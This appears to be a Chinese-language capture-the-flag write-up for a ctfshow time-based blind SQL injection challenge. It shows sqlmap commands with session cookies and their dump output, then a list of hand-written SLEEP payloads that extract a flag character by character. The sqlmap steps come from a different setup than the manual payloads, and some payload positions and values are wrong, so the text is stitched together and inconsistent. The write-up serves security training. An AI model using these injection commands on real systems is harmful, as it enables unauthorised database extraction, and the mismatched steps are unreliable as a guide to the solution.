## ctfshow-sql214

#####  sqlmap的使用手册: https://github.com/sqlmapproject/sqlmap/wiki/Usage

#####  比较详细的使用教程 : https://www.freebuf.com/sectool/164608.html



```
 要求：
开始基于时间盲注
```



```mysql
查询语句

//无
      
返回逻辑

//屏蔽危险分子
      

```



```shell
–user-agent=AGENT 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入
–-referer=REFERER sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入
使用–-data 调整sqlmap的请求方式
--data即为post请求
使用--method 调整sqlmap的请求方式
--method强制使用给定的HTTP方法（例如put）
注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单(form)提交的，put接收不到
使用--cookie 调整sqlmap的cookie
cookie=COOKIE     HTTP Cookieheader 值
使用--safe-url 调整sqlmap的访问方式
--safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下
使用--safe-url 调整sqlmap的访问请求次数
--safe-freq=SAFE..  测试一个给定安全网址的访问请求次数
 
--batch            从不询问用户输入，使用所有默认配置

--current-db       web当前使用的数据库

 --prefix=PREFIX     注入payload字符串前缀

--dbms=DBMS         强制后端的DBMS为此值(例如--dbms=mysql)

-v 3				参数来查看Payload
```



```
注入顺序
1.获取当前MySQL中的所有数据库
2.获取当前数据库名字
3.获取数据库下的数据表
4.获取表下的列名
5.导出数据
```



```mysql

          
--tamper 脚本使用自带的也可以 

          

查询数据库

sqlmap.py -u http://b8ec3feb-2c69-4968-a841-e7f7774e6466.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; td_cookie=1865350859; PHPSESSID=ljmnm94mpp13qreo8nb4d17aoj" --safe-url="http://b8ec3feb-2c69-4968-a841-e7f7774e6466.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --batch --tamper=210-212ctfshow-tamper -v 3 --dbs

[13:45:56] [DEBUG] used the default behavior, running in batch mode
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: id (PUT)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6806=6806 AND 'tibB'='tibB
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9496 FROM (SELECT(SLEEP(5)))QEWv) AND 'COQy'='COQy
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
         
[13:46:13] [DEBUG] performed 73 queries in 2.86 seconds
available databases [5]:
[*] ctfshow_web
[*] information_schema
[*] mysql
[*] performance_schema
[*] test

查表
sqlmap.py -u http://1f302e38-b6a5-4474-a4e3-1d47d85a5b9f.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; PHPSESSID=qmgbjgs652o8b334a1v5e7mr2u; td_cookie=1691265794" --safe-url="http://1f302e38-b6a5-4474-a4e3-1d47d85a5b9f.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --batch --tamper=210-212ctfshow-tamper -v 3 -D ctfshow_web --tables
          

Database: ctfshow_web
[1 table]
+--------------+
| ctfshow_user |
+--------------+

查列名
sqlmap.py -u http://1f302e38-b6a5-4474-a4e3-1d47d85a5b9f.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; PHPSESSID=qmgbjgs652o8b334a1v5e7mr2u; td_cookie=1691265794" --safe-url="http://1f302e38-b6a5-4474-a4e3-1d47d85a5b9f.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --batch --tamper=210-212ctfshow-tamper -v 3 -D ctfshow_web -T ctfshow_user --columns

[13:48:23] [DEBUG] performed 83 queries in 3.17 seconds
Database: ctfshow_web
Table: ctfshow_user
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| pass     | varchar(255) |
| username | varchar(255) |
+----------+--------------+
          
查内容
c
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),1,1))=99,sleep(2),1)&debug=1
t
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),2,1))=116,sleep(2),1)&debug=1
f
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),3,1))=102,sleep(2),1)&debug=1
s
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),4,1))=115,sleep(2),1)&debug=1
h
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),5,1))=104,sleep(2),1)&debug=1
o
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),6,1))=111,sleep(2),1)&debug=1
w
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),7,1))=119,sleep(2),1)&debug=1
{
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),8,1))=123,sleep(2),1)&debug=1
0
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),9,1))=48,sleep(2),1)&debug=1
b
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),10,1))=98,sleep(2),1)&debug=1
d
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),11,1))=100,sleep(2),1)&debug=1
1
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),12,1))=49,sleep(2),1)&debug=1
c
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),13,1))=99,sleep(2),1)&debug=1
f
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),14,1))=102,sleep(2),1)&debug=1
6
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),15,1))=54,sleep(2),1)&debug=1
9
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),16,1))=57,sleep(2),1)&debug=1
-
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),17,1))=45,sleep(2),1)&debug=1
a
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),18,1))=97,sleep(2),1)&debug=1
5
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),19,1))=53,sleep(2),1)&debug=1
0
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),20,1))=48,sleep(2),1)&debug=1
0
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),21,1))=48,sleep(2),1)&debug=1
-
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),22,1))=45,sleep(2),1)&debug=1
4
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),23,1))=52,sleep(2),1)&debug=1
8
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),24,1))=56,sleep(2),1)&debug=1
f
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),25,1))=102,sleep(2),1)&debug=1
2
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),26,1))=50,sleep(2),1)&debug=1
-
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),27,1))=45,sleep(2),1)&debug=1
b
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),28,1))=98,sleep(2),1)&debug=1
c
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),29,1))=99,sleep(2),1)&debug=1
f
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),30,1))=102,sleep(2),1)&debug=1
1
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),31,1))=49,sleep(2),1)&debug=1
-
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),32,1))=45,sleep(2),1)&debug=1
a
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),33,1))=97,sleep(2),1)&debug=1
9
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),34,1))=57,sleep(2),1)&debug=1
4
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),35,1))=52,sleep(2),1)&debug=1
8
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),36,1))=56,sleep(2),1)&debug=1
6
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),37,1))=54,sleep(2),1)&debug=1
c
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),38,1))=99,sleep(2),1)&debug=1
4
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),39,1))=52,sleep(2),1)&debug=1
d
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),40,1))=100,sleep(2),1)&debug=1
6
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),41,1))=100,sleep(2),1)&debug=1
9
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),57,1))=100,sleep(2),1)&debug=1
e
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),43,1))=101,sleep(2),1)&debug=1
1
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),44,1))=49,sleep(2),1)&debug=1
}
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),45,1))=125,sleep(2),1)&debug=1
无
ip=if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),46,1))=49,sleep(2),1)&debug=1
ctfshow{0bd1cf69-a500-48f2-bcf1-a9486c4d69e1}

```

